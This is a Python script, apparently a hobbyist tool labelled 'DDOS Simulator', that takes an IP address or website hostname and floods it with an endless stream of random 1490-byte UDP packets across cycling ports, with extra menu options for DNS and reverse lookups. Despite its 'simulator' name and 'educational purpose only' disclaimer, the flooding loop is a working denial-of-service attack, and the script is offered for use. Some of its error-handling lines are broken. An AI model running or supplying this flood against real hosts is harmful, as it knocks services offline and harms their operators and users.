from os import system
from time import sleep
from colorama import *
import time
import socket
import random    
try:   
    print(Fore.RED + "\t\t\tWelcome to DDOS Simulator - Distributed Denial of Service Simulator")
    print(Fore.RED + "\t\t\t===================================================================")
    print(Fore.LIGHTGREEN_EX+ "\t\t\t\tThis program is used to for DDOS attack")
    print(Fore.MAGENTA+ "\t\t\t\tAuthor: Muhammad Sami Furqan - Aisoft-co")
    print(Fore.RED+ "\t\t\t\tVersion: 1.0")  
    sleep(5)
    system("cls")
    print(Fore.RED+ "Disclaimer : This program is made for educational purpose only")
    print(Fore.RESET)
    while True:
     try:    
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         bytes = random._urandom(1490)
         askfor = input(Fore.BLUE+"""Select Options:
[A] DDoS using an ip address (If you already have an ip address) - Example [ 111.111.111.1 ] 
[B] DDoS using host (If you dont have an ip address) - By using website URL [ www.example.com ]
[C] Get Website IP Address - Example [ www.example.com ]
[D] Get IP Host Name - Example [ HostName ]
[E] Exit (Exits the program)
=> """)
         if askfor == "A":     

             try:
                 ip = input(Fore.LIGHTMAGENTA_EX + "Enter Ip address: ")     

                 try:
                     port = int(input(Fore.LIGHTMAGENTA_EX + "Port       : "))
                     print(Fore.RESET)
                 except str in port as e:
                     print(Fore.RED + "Dont use strings in port!")     

                 print(f"{Fore.LIGHTRED_EX}Starting an DDoS Attack on {ip}")
                 print(Fore.RESET)
                 print(Fore.BLUE)
                 print("[                    ] 0% ")
                 time.sleep(1)
                 print("[=====               ] 25%")
                 time.sleep(1)
                 print("[==========          ] 50%")
                 time.sleep(1)
                 print("[===============     ] 75%")
                 time.sleep(1)
                 print("[====================] 100%")
                 time.sleep(1)
                 print(Fore.RESET)
                 print(Fore.RED)
                 sent = 0
                 while True:
                     sock.sendto(bytes, (ip, port))
                     sent = sent + 1
                     port = port + 1
                     print("Sent %s packet to %s throught port:%s" %
                           (sent, ip, port))
                     if port == 65534:
                         port = 1     

             except KeyboardInterrupt as exception:
                  print(Fore.RESET)
                  KeyboardInterrupt == print(f"{Fore.RED}The Attack On {ip} Has Been Stopped - REASON : KeyBoard Interrupt\n")
             except socket.gaierror as axs:
                 socket.gaierror == print(f"{Fore.RED}{ip} <-- Wrong Ip address")     

         elif askfor =="B":
             try:
                 user13232 = input("Enter Host : ")
                 ip2 = socket.gethostbyname(user13232)
                 port2 = int(input("Port       : "))
                 print(f"{Fore.LIGHTRED_EX}Starting an DDoS Attack on {user13232}")
                 print(Fore.RESET)
                 print(Fore.BLUE)
                 print("[                    ] 0% ")
                 time.sleep(1)
                 print("[=====               ] 25%")
                 time.sleep(1)
                 print("[==========          ] 50%")
                 time.sleep(1)
                 print("[===============     ] 75%")
                 time.sleep(1)
                 print("[====================] 100%")
                 time.sleep(1)
                 print(Fore.RESET)
                 print(Fore.RED)
                 sent = 0
                 while True:
                     sock.sendto(bytes, (ip2, port2))
                     sent = sent + 1
                     port2 = port2 + 1
                     print("Sent %s packet to %s throught port:%s" %
                           (sent, ip2, port2))
                     if port2 == 65534:
                         port2 = 1
             except KeyboardInterrupt as exception:
                  print(Fore.RESET)
                  KeyboardInterrupt == print(f"{Fore.RED}The Attack On {ip2} Has Been Stopped - REASON : KeyBoard Interrupt\n")
             except socket.gaierror:
                 socket.gaierror == print(
                     f"{user13232} <-- Host Not Found + No ip address Found ")
         elif askfor == "C":
             try:
                 ask_host = input(Fore.LIGHTRED_EX + "Enter Host / WebUrl : ")
                 ip3 = socket.gethostbyname(ask_host)
                 print(Fore.LIGHTGREEN_EX+f"{ask_host} ip address is {ip3}\n")
             except :
                 print(Fore.RED+"Host Not Found + No ip address Found")
         elif askfor == "D":
             try:
                 ask_host2 = input(Fore.LIGHTRED_EX + "Enter IP : ")
                 ip4 = socket.gethostbyaddr(ask_host2)
                 print(Fore.LIGHTGREEN_EX+f"{ask_host2} ip address is {ip4}")
             except :
                 print(Fore.RED+"Ip Not Found + No Host address Found")
         elif askfor == "E":
             print("Exiting this program")
             exit()
         else:
             print("Wrong Option Selected!")
     except KeyboardInterrupt as exception:
            KeyboardInterrupt == print("Process Stopped - REASON : KeyBoard Interrupt\n")
except KeyboardInterrupt as exception:
    KeyboardInterrupt == input("Do you want to exit? (Y/N)")
    if KeyboardInterrupt == "Y":
        exit()
    else:
        pass
    